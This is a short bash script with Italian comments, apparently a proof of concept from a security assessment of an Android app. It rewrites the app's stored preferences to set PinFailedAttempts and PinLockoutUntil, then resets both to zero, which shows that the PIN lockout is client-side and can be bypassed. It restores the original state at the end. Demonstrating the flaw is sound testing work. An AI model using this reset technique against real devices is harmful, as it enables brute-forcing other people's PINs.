#!/bin/bash
# VULN-02: Rate Limiting Bypass - Reset failed attempts and lockout
source "$(dirname "$0")/00-common.sh"

banner "VULN-02: RATE LIMITING BYPASS"
check_device

BEFORE=$(read_prefs)
BACKUP="/tmp/av-backup-rl.xml"
echo "$BEFORE" > "$BACKUP"

# Step 1: Imposta lockout massimo
info "Impostazione lockout: 9 tentativi falliti + 8 ore..."
FUTURE=$(($(date +%s) * 1000 + 28800000))

echo "$BEFORE" \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"9\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"$FUTURE\"/" \
    > /tmp/av-locked.xml

write_prefs /tmp/av-locked.xml
restart_app

LOCKED=$(read_prefs)
ATTEMPTS=$(echo "$LOCKED" | grep "PinFailedAttempts" | sed -n 's/.*value="\([0-9]*\)".*/\1/p')
ok "PinFailedAttempts = $ATTEMPTS (lockout attivo)"
info ">>> VERIFICA SULL'EMULATORE: l'app mostra il messaggio di lockout"

echo ""
read -p "  Premi INVIO per resettare il lockout... "

# Step 2: Reset istantaneo
info "Reset: PinFailedAttempts=0, PinLockoutUntil=0..."

echo "$BEFORE" \
    | sed "s/name=\"PinFailedAttempts\" value=\"[0-9]*\"/name=\"PinFailedAttempts\" value=\"0\"/" \
    | sed "s/name=\"PinLockoutUntil\" value=\"[0-9]*\"/name=\"PinLockoutUntil\" value=\"0\"/" \
    > /tmp/av-unlocked.xml

write_prefs /tmp/av-unlocked.xml
restart_app

UNLOCKED=$(read_prefs)
ATTEMPTS_AFTER=$(echo "$UNLOCKED" | grep "PinFailedAttempts" | sed -n 's/.*value="\([0-9]*\)".*/\1/p')
ok "PinFailedAttempts = $ATTEMPTS_AFTER (lockout rimosso)"
info ">>> VERIFICA: l'app accetta di nuovo tentativi PIN"

echo ""
read -p "  Premi INVIO per ripristinare... "

write_prefs "$BACKUP"
restart_app
ok "Stato originale ripristinato"

banner "RISULTATO: Rate limiting client-side, resettabile a 0"
